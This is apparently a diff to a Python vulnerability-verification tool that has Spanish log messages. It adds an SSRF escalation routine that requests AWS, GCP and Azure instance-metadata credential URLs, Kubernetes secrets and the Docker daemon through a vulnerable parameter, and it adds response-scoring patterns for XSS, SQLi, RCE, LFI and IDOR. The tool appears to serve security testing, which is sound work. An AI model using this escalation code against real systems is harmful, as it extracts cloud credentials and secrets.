@@ -2394,6 +2394,61 @@ def verify_generic_ssrf(
                           f"peticion con {url_param}={res.evidence['callback_url_ganadora']!r} "
                           f"-- prueba de que el SERVIDOR emitio la peticion saliente, no el "
                           f"navegador del atacante")
+            # Cloud metadata escalation: try to access IMDS endpoints via the SSRF
+            # This proves actual impact (credential exposure via AWS/GCP/Azure metadata)
+            _CLOUD_METADATA_URLS = [
+                # AWS IMDSv1 — most common and direct
+                ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+                ("AWS", "http://169.254.169.254/latest/meta-data/hostname"),
+                # GCP metadata
+                ("GCP", "http://metadata.google.internal/computeMetadata/v1/instance/"),
+                # Azure IMDS
+                ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+                # Kubernetes service account
+                ("K8s", "http://kubernetes.default.svc/api/v1/namespaces/default/secrets"),
+                # Localhost internal services
+                ("internal", "http://localhost:8080/health"),
+                ("internal", "http://127.0.0.1:2375/version"),  # Docker daemon
+            ]
+            _cloud_hits = []
+            for _cloud_name, _cloud_url in _CLOUD_METADATA_URLS:
+                try:
+                    _cloud_payload = dict(parameters) if isinstance(parameters, dict) else {}
+                    _cloud_payload[url_param] = _cloud_url
+                    _cr = _http_request(m, base_url + endpoint, timeout=8,
+                                         data=_cloud_payload if m != "GET" else None,
+                                         params=_cloud_payload if m == "GET" else None,
+                                         headers=custom_headers or None)
+                    _body = (getattr(_cr, "text", "") or "")[:500]
+                    # Classify what we got back
+                    _is_creds = any(kw in _body.lower() for kw in
+                                    ("accesskeyid", "secretaccesskey", "token", "credential",
+                                     "serviceaccount", "computemetadata"))
+                    _is_meta = any(kw in _body.lower() for kw in
+                                   ("instance", "hostname", "region", "zone", "ami-id",
+                                    "kubernetes", "namespace"))
+                    if _is_creds or _is_meta:
+                        _cloud_hits.append({
+                            "cloud": _cloud_name,
+                            "url": _cloud_url,
+                            "status": _cr.status_code,
+                            "body_preview": _body[:200],
+                            "has_credentials": _is_creds,
+                        })
+                        step(f"  ssrf-escalation: {_cloud_name} metadata accesible "
+                             f"({'CREDENCIALES' if _is_creds else 'metadata'})")
+                except Exception:
+                    continue
+            if _cloud_hits:
+                res.evidence["ssrf_cloud_escalation"] = _cloud_hits
+                _cred_hit = next((h for h in _cloud_hits if h["has_credentials"]), None)
+                if _cred_hit:
+                    res.detail += (f"\n\nESCALACIÓN CLOUD: acceso a {_cred_hit['cloud']} IMDS "
+                                   f"con exposición de credenciales — impacto CRÍTICO")
+                else:
+                    res.detail += (f"\n\nESCALACIÓN CLOUD: acceso a metadata de "
+                                   f"{', '.join(h['cloud'] for h in _cloud_hits)} "
+                                   f"— servidor en entorno cloud")
             step(f"VERIFICADO: el listener interno recibio el token "
                  f"'{res.evidence['token_ganador']}' -- la peticion saliente la hizo el servidor.")
             _ssrf_url = base_url + endpoint
@@ -4268,6 +4323,171 @@ def verify_generic_header_bypass(
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
         lab.teardown()
+
+
+def _analyze_response_body(
+    body: str,
+    vuln_class: str,
+    payload: str = "",
+    confirm_string: str = "",
+    status_code: int = 0,
+) -> dict:
+    """Semantic analysis of an HTTP response body for exploitability signals.
+
+    Called when the response arrives but confirm_string is absent or empty.
+    Returns a dict:
+      partial_confidence: 0.0–0.85 — how confident we are the vuln is present
+      signals: list[str] — human-readable signals that raised confidence
+      interesting: bool — True when partial_confidence >= 0.30
+
+    Signal categories vary by vuln_class:
+      xss/ssti:   raw payload in body, unescaped <script> / alert(, event attrs
+      sqli:       SQL error keywords, database banners, row count changes
+      rce/cmdi:   command output patterns (uid=, /bin/sh, root:x:0:)
+      ssrf:       internal host leakage, cloud metadata patterns
+      lfi/traversal: file content patterns (/etc/passwd, root:x:0:)
+      missing-auth/idor: private data keywords (password, token, email, secret)
+    """
+    _body = (body or "")
+    _bl = _body.lower()
+    _vc = (vuln_class or "").lower().replace(" ", "-")
+    signals: list = []
+    score = 0.0
+
+    # --- Generic 2xx signal (baseline) ---
+    if status_code in range(200, 300) and _body.strip():
+        score += 0.05
+
+    # --- XSS / SSTI signals ---
+    if _vc in ("xss", "reflected-xss", "stored-xss", "ssti", "template-injection"):
+        # Payload appears unescaped
+        if payload and payload in _body:
+            score += 0.60
+            signals.append(f"payload appears verbatim in body (unescaped)")
+        # Script/event handler patterns
+        if "<script" in _bl and ("alert" in _bl or "onerror" in _bl):
+            score += 0.45
+            signals.append("unescaped <script> with alert/onerror found")
+        if "onerror=" in _bl or "onload=" in _bl:
+            score += 0.35
+            signals.append("event handler attribute (onerror/onload) found")
+        # SSTI execution signals: 49 = 7*7, 7777777777 etc.
+        if any(canary in _body for canary in ("49", "7777777777", "binoracle_ssti")):
+            score += 0.55
+            signals.append("SSTI arithmetic canary value found in body")
+        if "{{" not in _body and ("{%" in _body or "}}" in _body):
+            # Partial template execution
+            score += 0.20
+            signals.append("partial template execution trace")
+
+    # --- SQLi signals ---
+    if _vc in ("sqli", "sql-injection"):
+        _SQL_ERRORS = [
+            "you have an error in your sql syntax",
+            "unclosed quotation mark",
+            "quoted string not properly terminated",
+            "ora-01756", "ora-00933",
+            "pg_query(): query failed",
+            "unterminated quoted string at or near",
+            "sqlstate", "pdoexception",
+            "mysql_fetch", "sqlite3.operationalerror",
+        ]
+        for _err in _SQL_ERRORS:
+            if _err in _bl:
+                score += 0.70
+                signals.append(f"SQL error signature: '{_err[:40]}'")
+                break
+        # Row count or data exfiltration
+        if confirm_string and confirm_string in _body:
+            score += 0.80
+            signals.append(f"confirm_string '{confirm_string[:40]}' found")
+        elif any(pat in _body for pat in ("binoracle", "0x62696e6f", "sleep(5)", "SLEEP(5)")):
+            score += 0.65
+            signals.append("SQLi canary/sleep pattern found in body or headers")
+
+    # --- RCE / command injection signals ---
+    if _vc in ("rce", "command-injection", "os-command-injection", "code-injection"):
+        _RCE_PATTERNS = [
+            ("uid=0(root)", 0.90, "root uid in output"),
+            ("uid=", 0.75, "uid= in output (command executed)"),
+            ("/bin/sh", 0.70, "/bin/sh referenced in output"),
+            ("root:x:0:0:", 0.85, "/etc/passwd content in output"),
+            ("binoracle_rce_", 0.90, "RCE canary string found"),
+            ("command not found", 0.30, "'command not found' (shell reached)"),
+            ("total 0\ndrwxr", 0.60, "ls output pattern detected"),
+        ]
+        for pat, weight, label in _RCE_PATTERNS:
+            if pat.lower() in _bl:
+                score += weight
+                signals.append(label)
+                break
+        # Timing signal: response took notably long (not detectable here, but
+        # the __RCE_TIMING__ canary in confirm_string is handled upstream)
+
+    # --- SSRF signals ---
+    if _vc in ("ssrf", "server-side-request-forgery"):
+        _SSRF_PATTERNS = [
+            ("169.254.169.254", 0.80, "AWS/cloud metadata IP in body"),
+            ("ami-id", 0.75, "AWS AMI metadata in body"),
+            ("instance-id", 0.70, "cloud instance-id in body"),
+            ("localhost", 0.40, "localhost referenced in body"),
+            ("internal", 0.30, "'internal' server reference"),
+        ]
+        for pat, weight, label in _SSRF_PATTERNS:
+            if pat in _bl:
+                score += weight
+                signals.append(label)
+                break
+
+    # --- LFI / path-traversal signals ---
+    if _vc in ("lfi", "path-traversal", "directory-traversal"):
+        _LFI_PATTERNS = [
+            ("root:x:0:0:", 0.90, "/etc/passwd content found"),
+            ("/bin/bash", 0.70, "/etc/passwd or /etc/shells content"),
+            ("# /etc/", 0.65, "Linux config file content"),
+            ("[boot loader]", 0.75, "boot.ini content found"),
+            ("[extensions]", 0.65, "Windows INI file content found"),
+            ("[global]", 0.50, "config file [global] section"),
+        ]
+        for pat, weight, label in _LFI_PATTERNS:
+            if pat.lower() in _bl:
+                score += weight
+                signals.append(label)
+                break
+
+    # --- Missing-auth / IDOR signals ---
+    if _vc in ("missing-authorization", "auth-bypass", "idor",
+               "broken-access-control", "broken-object-level-authorization"):
+        _PRIV_KEYWORDS = {
+            "password": 0.60, "passwd": 0.60, "secret": 0.55,
+            "api_key": 0.65, "access_token": 0.65, "private_key": 0.70,
+            "ssn": 0.70, "credit_card": 0.70,
+        }
+        for kw, weight in _PRIV_KEYWORDS.items():
+            if kw in _bl:
+                score += weight
+                signals.append(f"private data keyword '{kw}' in response")
+                break
+        # JSON array with more than 2 items — data enumeration
+        import json as _json
+        try:
+            parsed = _json.loads(_body)
+            if isinstance(parsed, list) and len(parsed) > 2:
+                score += 0.40
+                signals.append(f"JSON array with {len(parsed)} items (data enumeration)")
+            elif isinstance(parsed, dict) and len(parsed) > 5:
+                score += 0.25
+                signals.append(f"JSON object with {len(parsed)} fields (possible data exposure)")
+        except Exception:
+            pass
+
+    # Cap score and deduplicate signals
+    score = min(score, 0.85)
+    return {
+        "partial_confidence": round(score, 2),
+        "signals": signals[:8],
+        "interesting": score >= 0.30,
+    }
 
 
 def _escalate_missing_auth_impact(
